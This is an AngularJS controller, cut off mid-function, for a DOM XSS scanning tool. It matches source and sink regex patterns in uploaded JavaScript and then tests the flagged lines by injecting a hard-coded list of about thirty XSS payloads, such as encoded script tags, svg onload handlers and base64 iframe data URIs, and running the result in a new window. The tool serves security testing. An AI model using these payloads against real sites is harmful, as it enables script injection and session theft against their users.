-/*d0kt0r 20/09/2014
1-them vars
2-scanjs
3-coderoad
4-sinkdegree
5-executejs
*/
scanjsModule.controller('ScanCtrl', ['$scope', 'ScanSvc', function ScanCtrl($scope, ScanSvc) {
  if (!document.getElementById("codeMirrorDiv").children.length) {
  $scope.codeMirror = new CodeMirror(document.getElementById('codeMirrorDiv'), {
    mode: 'javascript',
    lineNumbers: true,
    theme: 'mdn-like',
    value: "",
    readOnly:true,
    tabsize: 2,
    styleActiveLine: true
  });
  }
  /*
 |__   __| |  | |  ____|  \/  | \ \    / /\   |  __ \ / ____|
    | |  | |__| | |__  | \  / |  \ \  / /  \  | |__) | (___  
    | |  |  __  |  __| | |\/| |   \ \/ / /\ \ |  _  / \___ \ 
    | |  | |  | | |____| |  | |    \  / ____ \| | \ \ ____) |
    |_|  |_|  |_|______|_|  |_|     \/_/    \_\_|  \_\_____/ 
  */

  $scope.codeMirrorManual = undefined;
  $scope.inputFiles = [];
  $scope.results=[];
  $scope.errors=[];
  $scope.filteredResults=[];
  $scope.inputFilename="";
  $scope.issueList=[];
  $scope.throbInput = false;
  $scope.throbOutput = false;

  //Testing n1: Regexp XSS variables
  $scope.fileinstring = "No action";
  $scope.sscheck = false;
  $scope.regresults = [];
  $scope.regresults2 = [];
  $scope.n_results = 0;
  $scope.pattern_1 = /(location\s*[\[.])|([.\[]\s*["']?\s*(arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?|showModalDialog|cookie|URL|documentURI|baseURI|referrer|name|opener|parent|top|content|self|frames)\W)|(localStorage|sessionStorage|Database)/;
  $scope.pattern_2 = /((src|href|data|location|code|value|action)\s*["'\]]*\s*\+?\s*=)|((replace|assign|navigate|getResponseHeader|open(Dialog)?|showModalDialog|eval|evaluate|execCommand|execScript|setTimeout|setInterval)\s*["'\]]*\s*\()/;
  $scope.pattern_3 = /after\(|\.append\(|\.before\(|\.html\(|\.prepend\(|\.replaceWith\(|\.wrap\(|\.wrapAll\(|\$\(|\.globalEval\(|\.add\(|jQUery\(|\$\(|\.parseHTML\(/;
  $scope.regfinal = [];
  $scope.tmp_str = "teste";
  $scope.p1 = $scope.pattern_1.toString();
  $scope.p2 = $scope.pattern_2.toString();
  $scope.sys = "";
  $scope.sys2 = "";
  $scope.fna = ""; 
  $scope.teste = "";
  $scope.ret = "return var is empyth";


  //Testing Highlight lines
  $scope.vuln_1 = 0;
  $scope.vuln_2 = 0;
  $scope.vuln_3 = 0;
  $scope.vuln_4 = 0;
  $scope.vuln_5 = 0;
  $scope.vuln_6 = 0;
  $scope.crcheck = false;

  var pending = 0;
  var selectedFile = 0;
  var codeMirror_index = 0;

  $scope.vuln_1_list = [];
  $scope.vuln_2_list = [];
  $scope.vuln_3_list = [];
  $scope.vuln_4_list = [];
  $scope.vuln_5_list = [];
  $scope.vuln_6_list = [];  

  $scope.hide_sink_1 = false;
  $scope.hide_sink_2 = false;
  $scope.hide_sink_3 = false;
  $scope.hide_sink_4 = false;
  $scope.hide_sink_5 = false;
  $scope.hide_sink_6 = false;

  $scope.checkcr = false;

  /*
   _____  _____          _   _      _  _____ 
  / ____|/ ____|   /\   | \ | |    | |/ ____|
 | (___ | |       /  \  |  \| |    | | (___  
  \___ \| |      / /\ \ | . ` |_   | |\___ \ 
  ____) | |____ / ____ \| |\  | |__| |____) |
 |_____/ \_____/_/    \_\_| \_|\____/|_____/ */

  //Principal function of ScanJS
  $scope.run = function (source, filename) {
    //empty last scan
    $scope.results=[];
    $scope.errors=[];
    $scope.inputFiles.forEach(function (scriptFile, i) {
      if (document.getElementById('doScan_'+i).checked) {
        pending++;
    $scope.throbOutput = true;
        ScanSvc.newScan(scriptFile.name,scriptFile.asText());
        if ($scope.sscheck == true)
        {
          $scope.fileinstring = scriptFile.asText();
          $scope.runreg($scope.fileinstring,scriptFile.name);
        }
      }
    });

    //update UI
    document.querySelector("#scan-input").classList.toggle("hidden",true);
    document.querySelector("#scan-results").classList.toggle("hidden",false);
    document.querySelector("#tabsforall").classList.toggle("hidden",false);

    document.querySelector("#scan-output-rules").classList.toggle("hidden", false);
    document.querySelector("#scan-output-files").classList.toggle("hidden", false);
    document.querySelector("#custom").classList.toggle("hidden",true);
    if ($scope.sscheck == true) {
      //????document.querySelector("#regex-wrapper").classList.toggle("hidden", false);
    }

    //update navbar
    document.querySelector("#scan-input-nav").classList.toggle("active",false);
    document.querySelector("#scan-output-nav").classList.toggle("active",true);
  }

  $scope.updateIssueList = function(){
    $scope.issueList = $scope.results.reduce(function(p, c) {
      if ((c.type == 'finding') && (typeof p !== "undefined")) {
        if (p.indexOf(c.rule.name) < 0) {
          p.push(c.rule.name);
        }
        return p;
      }
    }, []);
  }

  $scope.filterResults=function(issue){
    if(!issue){
      $scope.filteredResults=$scope.results;
    }
    else{
      if(typeof issue.name != "undefined") {
  $scope.filteredResults=$scope.results.filter(function(result){
    return result.filename === issue.name;
  });
      }else {
  $scope.filteredResults=$scope.results.filter(function(result){
    return result.rule.name == issue;
  });
      }
    }
  }

  $scope.navShowInput = function () {
    //show input tab, hide results
    document.querySelector("#scan-input").classList.toggle("hidden", false);
    document.querySelector("#scan-results").classList.toggle("hidden", true);
    document.querySelector("#scan-output-rules").classList.toggle("hidden", true);
    document.querySelector("#scan-output-files").classList.toggle("hidden", true);
    document.querySelector("regex-wrapper").classList.toggle("hidden", true);
    document.querySelector("#custom").classList.toggle("hidden",true);
    document.querySelector("#tabsforall").classList.toggle("hidden", true);
    document.querySelector("#backtrackdiv").classList.toggle("hidden", true);
    document.querySelector("#checksinkselected").classList.toggle("hidden", true);
    document.querySelector("#gview").classList.toggle("hidden", true);
    document.querySelector("#coderoaddiv").classList.toggle("hidden", true);



    //make input the active nav element
    document.querySelector("#scan-input-nav").classList.toggle("active", true);
    document.querySelector("#scan-output-nav").classList.toggle("active", false);
  }

  $scope.navShowOutput = function (filterIssue) {
    //show input tab, hide results
    document.querySelector("#scan-input").classList.toggle("hidden", true);
    document.querySelector("#scan-results").classList.toggle("hidden", false);
    document.querySelector("#scan-output-rules").classList.toggle("hidden", false);
    document.querySelector("#scan-output-files").classList.toggle("hidden", false);
    document.querySelector("#custom").classList.toggle("hidden",true);

    //make input the active nav element
    document.querySelector("#scan-input-nav").classList.toggle("active", false);
    document.querySelector("#scan-output-nav").classList.toggle("active", true);
    $scope.filterResults(filterIssue);
  }

  $scope.handleFileUpload = function handleFileUpload(fileList) {
    function handleMaybeZip() {
      //packaged app case
      var reader = new FileReader();
      $scope.inputFilename = fileList[0].name;
      reader.onload = function () {
        var magic = new DataView(this.result).getUint32(0, true /* LE */);
        if (magic !== 0x04034b50) { // magic marker per spec.
          handleList();
          return;
        }
        reader.onload = function() {
          var zip = new JSZip(this.result);
          $scope.inputFiles = zip.file(/\.js$/);
          $scope.$apply();
        };
        reader.readAsArrayBuffer(fileList[0]);
      };
      reader.readAsArrayBuffer(fileList[0].slice(0, 4));
    };

    function handleList() {
      //uploading individual js file(s) case
      $scope.inputFilename="Multiple files";
      var jsType = /(text\/javascript|application\/javascript|application\/x-javascript)/;
      var zip = new JSZip(); //create a jszip to manage the files

      for (var i = 0; i < fileList.length; i++) {
        var file = fileList[i];
        console.log('adding file:',file.name)
        if (!file.type.match(jsType)) {
          console.log("Ignoring non-js file:" + file.name + "(" + file.type + ")")
        }
        var reader = new FileReader();
        reader.readAsText(file);

        reader.onload = (function (file) {
          var fileName = file.name;
          return function(e){
            //add file to zip
            zip.file(fileName, e.target.result)
            $scope.inputFiles = zip.file(/.*/); //returns an array of files
            $scope.$apply();

          };
        })(file)

        reader.onerror = function (e) {
          $scope.error = "Could not read file";
          $scope.$apply();
        }
      }
    };
    $scope.throbInput = true;
    $scope.$apply();
    //enable fileselect div
    //document.querySelector("#scan-intro").classList.toggle("hidden",true);
    document.querySelector("#scan-files-selected").classList.toggle("hidden",false);

    if (fileList.length === 1) {
      handleMaybeZip();
    }
    else {
      handleList();
    }
    $scope.throbInput = false;
    $scope.$apply();
  }

  $scope.showFile = function (index) {
    document.querySelector("#code-mirror-wrapper").classList.toggle("hidden",false);
    if($scope.inputFiles.length<1){
      return;
    }
    if(!index){
      index=0;
    }
    if ($scope.inputFiles.length > 0) {
      $scope.codeMirror.setValue($scope.inputFiles[index].asText());
    }
    codeMirror_index = index;
    document.querySelector("#filename-badge").textContent = $scope.inputFiles[index].name;
  }

  $scope.showResult = function (filename,line, col) {
    document.querySelector("#code-mirror-wrapper").classList.toggle("hidden",false);
    document.querySelector("#filename-badge").textContent = filename;
    var file = $scope.inputFiles.find(function(f){return f.name === filename});
    $scope.fileinstring = file.asText();
    $scope.fna = filename;
    $scope.codeMirror.setValue(file.asText());
    $scope.codeMirror.setCursor(line - 1, col || 0);
    $scope.codeMirror.focus();
    document.querySelector("#coderoaddiv").classList.toggle("hidden", false);
    if($scope.crcheck == true){
      $scope.rcr();
    }
  };

  $scope.saveState = function() {
    var includedAttributes = ['line','filename','rule', 'desc', 'name', 'rec','type'];
    /* A list of attributes we want include. Example:
    line: ..
    filename: ..
    rule: {
      desc: ..
      name: ..
      rec: ..
      type: ..
      }
    }
     */
    var serializedResults = JSON.stringify($scope.results, includedAttributes);
    localforage.setItem('results', serializedResults, function() { });

    var serializedErrors = JSON.stringify($scope.errors);
    localforage.setItem('errors', serializedErrors, function() { });

    var serializedInputFiles = $scope.inputFiles.map( function(el) { return {data: el.asText(), name: el.name }; });
    localforage.setItem("inputFiles", JSON.stringify(serializedInputFiles), function(r) { });

    var checkboxes = [];
    for (var i=0; i < $scope.inputFiles.length; i++) {
      checkboxes.push(document.getElementById("doScan_" + i).checked);
    }
    localforage.setItem("checkboxes", JSON.stringify(checkboxes));
    localforage.setItem("cm_index", JSON.stringify(codeMirror_index));
  };

  //TODO loadstate isn't called anymore, need to make it work with new workflow
  //TODO -> call loadState() around in main.js, line 36 (using the scanCtrlScope) and expose "reset" button in the UI.
  $scope.restoreState = function() {
    var apply = false;
    localforage.getItem('results', function (results_storage) {
      $scope.results = JSON.parse(results_storage);
      apply = true;
      });
    localforage.getItem('errors', function (errors_storage) {
      if (errors_storage) {
        $scope.errors = JSON.parse(errors_storage);
        apply = true;
      }
    });
    // restore files, by creating JSZip things :)
    localforage.getItem("inputFiles", function(inputFiles_storage) {
      // mimic behavior from handleFileUpload
      var files = JSON.parse(inputFiles_storage);
      var zip = new JSZip();
      files.forEach(function(file) {
        zip.file(file.name, file.data);
      });
      $scope.inputFiles = zip.file(/.*/);

      // nest checkbox import into the one for files, so we ensure the "inputFiles.length" check succeeds.
      localforage.getItem("checkboxes", function (checkboxes_storage) {
        var checkboxes = JSON.parse(checkboxes_storage);

        var ln=$scope.inputFiles.length
        for (var i=0; i < ln; i++) {
          document.getElementById("doScan_" + i).checked = checkboxes[i];
        }
      });
      apply = true;
    });
    if (apply) { $scope.$apply(); }
  };

  $scope.selectAll = function () {
    var element;
    var i = $scope.inputFiles.length-1;
    while (element=document.getElementById('doScan_'+i)) {
      element.checked = true;
      i--;
    }
  };
  $scope.selectNone = function () {
    var element;
    var i = $scope.inputFiles.length-1;
    while (element=document.getElementById('doScan_'+i)) {
      element.checked = false;
      i--;
    }
  };
  $scope.getSnippet = function (filename,line,numLines) {
    var file = $scope.inputFiles.find(function (f) {
      return f.name === filename
    });
    var content=file.asText();
    return content.split('\n').splice(line,line+numLines).join('\n');
  };

  $scope.$on('NewResults', function (event, result) {
    if (--pending <= 0) { $scope.throbOutput = false; }
    if (Object.keys(result).length === 0) {
      $scope.error = "Empty result set (this can also be a good thing, if you test a simple file)";
      return
    }
    $scope.results=$scope.results.concat(result.findings);
    $scope.filteredResults=$scope.results;
    $scope.error = "";
    $scope.updateIssueList();
    /* this is likely a bug in angular or how we use it: the HTML template sometimes does not update
       when we change the $scope variables without it noticing. $scope.$apply() enforces this. */
    $scope.$apply();
    $scope.saveState();
  });

  $scope.$on('ScanError', function (event, exception) {
    if (--pending <= 0) { $scope.throbOutput = false; }
    $scope.errors.push(exception);
    $scope.updateIssueList();
    $scope.$apply();
    $scope.saveState();
  });


  document.getElementById("scan-file-input").addEventListener("change", function(evt) {
    $scope.handleFileUpload(this.files);
  });

  /*
   _____ ____  _____  ______ _____   ____          _____  
  / ____/ __ \|  __ \|  ____|  __ \ / __ \   /\   |  __ \ 
 | |   | |  | | |  | | |__  | |__) | |  | | /  \  | |  | |
 | |   | |  | | |  | |  __| |  _  /| |  | |/ /\ \ | |  | |
 | |___| |__| | |__| | |____| | \ \| |__| / ____ \| |__| |
  \_____\____/|_____/|______|_|  \_\\____/_/    \_\_____/
  */

  //Custom REGEXP functions
  $scope.savecfg = function (){
  //verificação de entrada da strings (limpar espaços vazios e entrada)
  if ($scope.p1 == ''){
    $scope.sys = "String 1 is NULL, please reform.";
  } else {
    if ($scope.p2 == ''){
      $scope.sys = "String 2 is NULL, please reform";
    } else { 
      $scope.sys = "Saved" 
      $scope.pattern_2 = new RegExp($scope.p2);
      $scope.pattern_1 = new RegExp($scope.p1);
    }; 
  };
  };

  //return file in string
  $scope.getfile = function  () {
    return $scope.fileinstring;
  };

  //return results fomr the regexp
  $scope.getresult = function (){
     return $scope.regresults;
  };

  //return number of results from the regexp
  $scope.get_n_results = function () {
    return $scope.regfinal.length;
  };

  //Clean the faulty js string result from the match (why not fix this??)
  $scope.cleanstring = function (str) {
    for(var i = str.length; i--;){
      if (!str[i] || str[i] == ' ') str.splice(i, 1);
    };
    return str;
  };

  $scope.showcustom = function () {
    document.querySelector("#custom").classList.toggle("hidden",false);
  };

  $scope.activate_res = function (){
    document.querySelector("#scan-results").classList.toggle("hidden",false);
    document.querySelector("#results-wrapper").classList.toggle("hidden",false);
    document.querySelector("#error-wrapper").classList.toggle("hidden",true);
    document.querySelector("#regex-wrapper").classList.toggle("hidden",true);
  };  

  $scope.activate_reg = function (){
    document.querySelector("#results-wrapper").classList.toggle("hidden",true);
    document.querySelector("#error-wrapper").classList.toggle("hidden",true);
    if ($scope.sscheck == true) {
      document.querySelector("#regex-wrapper").classList.toggle("hidden", false);
    }
  };

  $scope.activate_err = function (){
    document.querySelector("#scan-results").classList.toggle("hidden",false);
    document.querySelector("#results-wrapper").classList.toggle("hidden",true);
    document.querySelector("#error-wrapper").classList.toggle("hidden",false);
    document.querySelector("#regex-wrapper").classList.toggle("hidden",true);
  };

  //Execution of REGEXP
  $scope.runreg = function (str, filename) {
    //Codigo com teste do slip line
    lines = str.split("\n");
    //$scope.teste = lines;
    for (var tmp = 0; tmp < lines.length; tmp++)
    {
      //Atribuir o valor da linha a variavel teste
      $scope.teste = lines[tmp];
      //começar a executar o pattern na linha
      $scope.regresults = $scope.pattern_1.exec($scope.teste);
      //verificar se houve resultados
      if($scope.regresults != null)
      {
        $scope.tmp_str = $scope.cleanstring($scope.regresults);
        $scope.cnt = $scope.regfinal.length;
        $scope.regfinal[$scope.cnt] = 
            {fn: filename, ln: tmp+1, regr: $scope.tmp_str[0], tipo: 'Source'};
      };
      //começar a executar o patter na linha mas so que o 2
      $scope.regresults2 = $scope.pattern_2.exec($scope.teste);
      if($scope.regresults2 != null)
      {
        $scope.tmp_str = $scope.cleanstring($scope.regresults2);
        $scope.cnt = $scope.regfinal.length;
        $scope.regfinal[$scope.cnt] = 
            {fn: filename, ln: tmp+1, regr: $scope.tmp_str[0], tipo: 'Sink'};
      }
    };
  };  

  //hit counter for the coderoad test
  $scope.cnt_hits = function (ret){
     var l,c;
    for ( i = 0; i < ret.length; i++)
    {
      c = ret[i][1];
      l = ret[i][0];  
      if ( c == 'orange'){
          $scope.vuln_1 +=1;
          $scope.vuln_1_list.push(l);
      }
      if ( c == 'yellow'){
         $scope.vuln_2 +=1;
         $scope.vuln_2_list.push(l); 
      }
      if ( c == 'grey'){
         $scope.vuln_3 +=1;
         $scope.vuln_3_list.push(l);
      }
      if ( c == 'BurlyWood'){
         $scope.vuln_4 +=1;
         $scope.vuln_4_list.push(l);
      }
      if ( c == '#FF00FF'){
         $scope.vuln_5 +=1;
         $scope.vuln_5_list.push(l);
      }
      if ( c == 'red'){
         $scope.vuln_6 +=1;
         $scope.vuln_6_list.push(l);
      }   
    };
  }

  //Feature to show the number of the line from the hit
  $scope.runcrcheck = function (n){
    if ($scope.checkcr == true){
      if(n == 1){
        if($scope.vuln_1_list.length > 0)
        {
          $scope.hide_sink_1 = true;
        }  
      }
      if(n == 2){
        if($scope.vuln_2_list.length > 0)
        {
          $scope.hide_sink_2 = true;
        }  
      }
      if(n == 3){
        if($scope.vuln_3_list.length > 0)
        {
          $scope.hide_sink_3 = true;
        }  
      }  
      if(n == 4){
        if($scope.vuln_4_list.length > 0)
        {
          $scope.hide_sink_4 = true;
        }  
      }
      if(n == 5){
        if($scope.vuln_5_list.length > 0)
        {
          $scope.hide_sink_5 = true;
        }  
      }
      if(n == 6){
        if($scope.vuln_6_list.length > 0)
        {
          $scope.hide_sink_6 = true;
        }  
      }  
    }
  };

  //Variable to control the button check
  $scope.btcheck = false;

  //Run codeRoad
  $scope.rcr = function(){
    $scope.btcheck = true;
    //document.querySelector("#crbtn").classList.toggle("hidden", true);
    $scope.checkcr = true;
    $scope.button_clicked = true;
    // document.querySelector("#crbtn").getAttribute('disabled').toBeTruthy();
    if($scope.crcheck == false){
      $scope.ret = analyze($scope.fileinstring);
      $scope.cnt_hits($scope.ret);
    }
    $scope.crcheck = true;

    //codigo para hihglight no codemirror
    //$scope.showResult($scope.inputFilename,1,0);

    var l,c;
    for ( i = 0; i < $scope.ret.length; i++)
    {
       l = $scope.ret[i][0];
       c = $scope.ret[i][1];
       $scope.setHighlight(l, c);
    };
    //$scope.$apply();
  };

  //Dont judge me for my code
  $scope.clearvars = function (){
    $scope.codeMirror.setValue("");
    $scope.hide_sink_1 = false;
    $scope.hide_sink_2 = false;
    $scope.hide_sink_3 = false;
    $scope.hide_sink_4 = false;
    $scope.hide_sink_5 = false;
    $scope.hide_sink_6 = false;
    $scope.checkcr = false;
    $scope.vuln_1_list = [];
    $scope.vuln_2_list = [];
    $scope.vuln_3_list = [];
    $scope.vuln_4_list = [];
    $scope.vuln_5_list = [];
    $scope.vuln_6_list = [];  
    $scope.vuln_1 = 0;
    $scope.vuln_2 = 0;
    $scope.vuln_3 = 0;
    $scope.vuln_4 = 0;
    $scope.vuln_5 = 0;
    $scope.vuln_6 = 0;
    $scope.crcheck = false;
  };

  //hight light codemirror
  $scope.setHighlight = function (lineNumber, color) {
 
    //Line number is zero based index
    var actualLineNumber = lineNumber - 1;
    //Select editor loaded in the DOM
    var myEditor = angular.element(document.querySelector(("#codeMirrorDiv")));

    var codeMirrorEditor = myEditor[0].childNodes[0].CodeMirror;
    if ( color == 'orange'){
       codeMirrorEditor.addLineClass(actualLineNumber, 'background', 'active_source');     
    }
    if ( color == 'yellow'){
       codeMirrorEditor.addLineClass(actualLineNumber, 'background', 'active_variable'); 
    }
    if ( color == 'grey'){
       codeMirrorEditor.addLineClass(actualLineNumber, 'background', 'non_active_variable');   
    }
    if ( color == 'BurlyWood'){
       codeMirrorEditor.addLineClass(actualLineNumber, 'background', 'non_active_source');   
    }
    if ( color == '#FF00FF'){
       codeMirrorEditor.addLineClass(actualLineNumber, 'background', 'active_function');   
    }
    if ( color == 'red'){
       codeMirrorEditor.addLineClass(actualLineNumber, 'background', 'active_sink');   
    }   
  };

  /*
   |  _ \   /\   / ____| |/ /__   __|  __ \     /\   / ____| |/ /
   | |_) | /  \ | |    | ' /   | |  | |__) |   /  \ | |    | ' / 
   |  _ < / /\ \| |    |  <    | |  |  _  /   / /\ \| |    |  <  
   | |_) / ____ \ |____| . \   | |  | | \ \  / ____ \ |____| . \ 
   |____/_/    \_\_____|_|\_\  |_|  |_|  \_\/_/    \_\_____|_|\_\
   Funcao princpal: showbox()*/

  //Variables from engine.js JSPRIME
  $scope.real_func_names = real_func_names; //nome das funcoes
  $scope.real_func_Scope = real_func_Scope; 
  $scope.real_func_call = real_func_call; //call das funcoes no codigo todo.
  $scope.real_variable_const = real_variable_const;//Vazia na reload.js
  $scope.real_variable_var = real_variable_var; //Declaração de todas as variaveis
  $scope.real_variable_obj = real_variable_obj;//vazio tambem.... na reload.js

  $scope.n_funcao = {};
  $scope.in_info = {};
  $scope.in_funct = "";
  $scope.in_var = [];
  $scope.declare_variable = [];
  $scope.variable_declare = []; //mudar o nome desta merda

  $scope.treeData = [];

  $scope.get_functions_name = function(n){
    for(var i = 0 ; i < real_func_Scope.length; i++){
      if(real_func_Scope[i+1] == null){
        return [real_func_Scope[i].name,real_func_Scope[i].line];
      }
      if(n > real_func_Scope[i].line && n < real_func_Scope[i+1].line){
        return [real_func_Scope[i].name,real_func_Scope[i].line];
      }
    }
  }

  //CLick event for button backtrack
  $scope.rbt = function (){
    document.querySelector("#backtrackdiv").classList.toggle("hidden", false);
  };

  //BLACK MAGIC AFTER THIS LINE

  $scope.ginfo = function (n){
    for(var i = 0; i < real_func_call.length; i++){
      if(real_func_call[i].line == n){
        return real_func_call[i];
      }
    }
  };

  $scope.get_var_info = function(vari){
    for(var i = 0; i < real_variable_var.length; i++)
    {
      if(vari == real_variable_var[i].name)
      {
        return real_variable_var[i];
      }
    }
    return;
  };

  $scope.showbox = function(n){
    document.querySelector("#checksinkselected").classList.toggle("hidden", false);
    $scope.treeData = [];
    $scope.check_sink_degree();
    $scope.build_tree(n);
  };

  $scope.new_node = function(name,line,child,classinput){
    return {"line":line,"name":name,"folderClass":"fa fa-caret-right","nodes":child,"class":classinput};
  };

  $scope.array_vars = function(vars){
    var ret = [];
    var tmp = "";
    var linefuckers;
    for(var i = 0; i < vars.length; i++){
      tmp = vars[i].match(/#RANDOM/gi);
      if(tmp == null)
      {
        linefuckers = $scope.get_var_info(vars[i]);
        if(linefuckers != undefined){
        ret.push($scope.new_node(vars[i],linefuckers.line,[]));
        }
        else{
         ret.push($scope.new_node(vars[i],0,[])); //esprima só espreme merda
        }
      }
    }
    return ret;
  };

  $scope.get_declaration = function (line){
    var tmp;
    for( var i = 0; i< real_func_call.length; i++){
      if(line == real_func_call[i].line)
        return $scope.new_node(real_func_call[i].name, real_func_call[i].line,[],"label label-danger");//O que meter para filhos da declaracoes das variaveis da sink?
    };
  };

  var n_const = 0;
  var tmp_sink = [];

  $scope.var_const = function (){
    for(var i = 0; i < tmp_sink.arguments.literals.length; i++){
      if( i == n_const){
        n_const++;
        return tmp_sink.arguments.literals[i];
      }
    }
  };

  $scope.childisfunction = function (node){
    for(var i = 0; i < real_func_call.length; i++){
      if(node.name == real_func_call[i].name && node.line == real_func_call[i].line)
        return real_func_call[i];
    }
    return false;
  }

  $scope.varinfo = function(vars){
    for(var i = 0; i < vars.length; i++){
      var ret = [];
      if(vars[i].name.match(/#CONSTANT/g) != undefined)
      {
            ret.push($scope.new_node($scope.var_const(n_const),0,[]));
            vars[i].nodes = ret;
      }
      for(var x = 0; x < real_variable_var.length; x++){
        if(vars[i].name == real_variable_var[x].name){
          ret.push($scope.new_node(real_variable_var[i].value,real_variable_var[x].line,[]));
          var tmp_node = $scope.childisfunction(vars[i])
          if(tmp_node != false){
            ret.push($scope.new_node("Função:",0,$scope.get_childs(tmp_node)));
          }
          ret.push($scope.get_declaration(real_variable_var[x].line));
          vars[i].nodes = ret;
        } 
      }
    }
  };

  $scope.glass_func = function(){
    //do nothing yet;
  };

  var old_sink;

  $scope.get_childs = function (fsink){
    old_sink = tmp_sink;
    tmp_sink = fsink;
    var sink_vars = fsink.arguments.variables;
    var sink_func = fsink.arguments.functions;
    var ret_vars = $scope.array_vars(sink_vars);
    $scope.varinfo(ret_vars);
    var ret_func = [];
    for(var x = 0; x < sink_func.length; x++){
      ret_func.push($scope.glass_func(sink_func[i]));
    }
    var ret =  [$scope.new_node("Variaveis:",0,ret_vars,"label label-info")/*,$scope.new_node("Funcoes:",0,ret_func,"label label-info")*/];
    n_const =0;
    tmp_sink = old_sink;
    return ret;
  };

  $scope.build_tree = function(n){
    n_const =0;
    var f_sink = $scope.ginfo(n);

    //Codigo para tratar a sink
    //Ver nome, linha, variaveis de entrada 
    $scope.treeData[0] = $scope.new_node(f_sink.name, f_sink.line, $scope.get_childs(f_sink));
  };

  $scope.toggleChildren = function(data,line) {
    $scope.showResult($scope.fna,line,0);
    data.childrenVisible = !data.childrenVisible;
      data.folderClass = data.childrenVisible?"fa fa-caret-down":"fa fa-caret-right";
  };

/*
  / ____|_   _| \ | | |/ /  __ \|  ____/ ____|  __ \|  ____|  ____|
 | (___   | | |  \| | ' /| |  | | |__ | |  __| |__) | |__  | |__   
  \___ \  | | | . ` |  < | |  | |  __|| | |_ |  _  /|  __| |  __|  
  ____) |_| |_| |\  | . \| |__| | |___| |__| | | \ \| |____| |____ 
 |_____/|_____|_| \_|_|\_\_____/|______\_____|_|  \_\______|______|
*/
  $scope.traps = ["location","prompt","input"];
  $scope.isUserIn = false;

  //simple match all active variables to a predefined array with user input functions

  $scope.check_sink_degree = function(){
    var txt = $scope.fileinstring.split("\n");
    for(var x = 0; x < $scope.vuln_1_list.length; x++){
      for(var i = 0; i < $scope.traps.length; i++){
        var tmp_1 = txt[$scope.vuln_1_list[x]-1];
        var tmp_2 = $scope.traps[i];
        if(tmp_1.indexOf(tmp_2) != -1){
          $scope.isUserIn = true;
        }
      }  
    }
  };

  /*
 |  ____\ \ / /  ____/ ____| |  | |__   __|  ____|  / ____/ __ \|  __ \|  ____|
 | |__   \ V /| |__ | |    | |  | |  | |  | |__    | |   | |  | | |  | | |__   
 |  __|   > < |  __|| |    | |  | |  | |  |  __|   | |   | |  | | |  | |  __|  
 | |____ / . \| |___| |____| |__| |  | |  | |____  | |___| |__| | |__| | |____ 
 |______/_/ \_\______\_____|\____/   |_|  |______|  \_____\____/|_____/|______|
 Função principal: exejs (trigada no evento click do botao execute)
 */

  //Variaveis
  var msg = "DOM XSS Confirmed !!";
  var domInject = [];
  var domInjectSource = [];
  var win;
  var tmp_2;

  //testing yet not working 
  $scope.attack_vector = ["%22%3Cscript%3Ealert%28%27XSSYA%27%29%3C%2Fscript%3E;",
              "1%253CScRiPt%2520%253Eprompt%28962477%29%253C%2fsCripT%253E;",
                "<script>alert('xssya')</script>;",
                "'';!--\"<XSS>=&{()};",
                "%3CScRipt%3EALeRt(%27xssya%27)%3B%3C%2FsCRipT%3E;",
                "<scr<script>ipt>alert(1)</scr<script>ipt>;",
                "%3cscript%3ealert(%27XSSYA%27)%3c%2fscript%3e;",
                "%3cbody%2fonhashchange%3dalert(1)%3e%3ca+href%3d%23%3eclickit;",
                "%3cimg+src%3dx+onerror%3dprompt(1)%3b%3e%0d%0a;",
                "%3cvideo+src%3dx+onerror%3dprompt(1)%3b%3e;",
                "<iframesrc=\"javascript:alert(2)\">;",
                "<iframe/src=\"data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">;",
                "<form action=\"Javascript:alert(1)\"><input type=submit>;",
                "<isindex action=data:text/html, type=image>;",
                "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\">;",
                "<svg/onload=prompt(1);>;",
                "<marquee/onstart=confirm(2)>/;",
                "<body onload=prompt(1);>;",
                "<q/oncut=open()>;",
                "<a onmouseover=location=’javascript:alert(1)>click;",
                "<svg><script>alert&#40/1/&#41</script>;",
                "&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
                "<scri%00pt>alert(1);</scri%00pt>;",
                "<scri%00pt>confirm(0);</scri%00pt>;",
                "5\x72\x74\x28\x30\x29\x3B'>rhainfosec;",
                "<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>;",
                "<marquee/onstart=confirm(2)>;",
                "<A HREF=\"http://www.google.com./\">XSS</A>;",
                "<svg/onload=prompt(1);>;"];
 
  //Zona da declaração do vector de ataque.
  //$scope.attack_vector = [];
  //$scope.attack_vector[0] = "alert('Attack #1');";
  $scope.attack_vector.push("$scope.var_tst = true;");
  $scope.var_tst = false;
  $scope.cmdgraph = false;


  $scope.exejs = function(){
    //Inicializacao do Codigo dos graficos
    $scope.init_charts();
    //Codigo Actual da Função
    $scope.percentagem_success = 0; 
    var total_per = 100 / $scope.attack_vector.length;
    var aScr = $scope.fileinstring.split("\n");
    var total_vuln = 100 / $scope.vuln_1_list.length;
    var tmp_vuln = 0;

    for(var i = 0; i < $scope.vuln_1_list.length; i++){
      tmp_vuln += total_vuln;

      setTimeout(function () {
        $scope.chart2.load({
          columns: [['data', tmp_vuln]]
        });
      }, 2000); 

      var cnt = parseInt($scope.vuln_1_list[i]);
      var data = aScr[cnt-1]; //-1 por causa do codemirror
      var aSource = data.split("=");
      var str = "";

      for(var z = 0; z < $scope.attack_vector.length; z++){
        $scope.percentagem_success += total_per;
        aSource[1] = $scope.attack_vector[z];
        str = aSource[0] + '=' + aSource[1];
        aScr[cnt-1] = str;
        var fin ="";
        setTimeout(function () {
            $scope.chart.load({
                columns: [['data', $scope.percentagem_success]]
            });
        }, 1000);      
        for(var x = 0; x < aScr.length; x++){
          fin += aScr[x];
        }
        $scope.exejsvuln(fin,$scope.findfunction(cnt));
      };
    };
  };

  //function to find the main funtion sof the sink
  $scope.findfunction = function (line){
    var ar = real_func_names.sort(function(a,b){return a.line - b.line});
    for(var i = 0; i < ar.length; i++){
      if(ar[i+1] != null){
        if(line >= ar[i].line && line <= ar[i+1].line ){
            return ar[i].name;
         }  
      }
      else{
          return ar[i].name;
      }
    }
  };

  //function to execute the edited code
  $scope.exejsvuln = function (code,funcname){
    win = window.open("testing.html");
    win.document.write("<html><head></head><body><button id='mybutton'>click me</button></body></html>");
    var button = win.document.getElementById('mybutton');
    button.onclick = function() {
